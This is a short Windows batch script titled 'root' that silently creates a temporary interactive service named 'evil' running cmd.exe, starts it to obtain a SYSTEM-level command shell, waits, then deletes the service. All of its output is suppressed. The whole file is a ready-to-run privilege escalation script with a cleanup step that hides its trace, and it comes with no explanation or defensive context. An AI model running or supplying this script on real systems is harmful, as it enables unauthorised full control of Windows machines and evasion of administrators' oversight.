@echo off
@break off title root
Cls
echo Creating service.
sc create evil binpath= "cmd.exe /K start" type= own type= interact > nul 2>&1
echo Starting service.
sc start evil > nul 2>&1
echo Standing by...
ping 127.0.0.1 -n 4 > nul 2>&1
echo Removing service.
echo.
sc delete evil > nul 2>&1